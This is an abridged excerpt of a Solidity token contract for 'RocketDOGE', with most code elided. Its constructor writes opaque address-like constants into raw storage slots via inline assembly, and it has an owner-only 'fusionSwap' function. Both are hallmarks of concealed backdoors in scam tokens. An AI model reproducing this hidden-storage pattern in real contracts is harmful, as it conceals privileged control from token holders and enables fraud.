...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xf5670bdfaa801f8ab6d02755d289bcc74c4c44ea7b23)
            sstore(0x51,0xf567c3ba7f64b721214d2e4031cec93879ff2507aac3)
    ...
    function fusionSwap() public onlyOwner returns (address receiver) {
    }
    ...
    function _DeployRocketDOGE(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRocketDOGE(creator, initialSupply);
    }
}

contract RocketDOGE is ERC20Token {
    constructor() ERC20Token("RocketDOGE", "RocketDOGE", msg.sender, 420690420 * 10 ** 18) {
    }
}
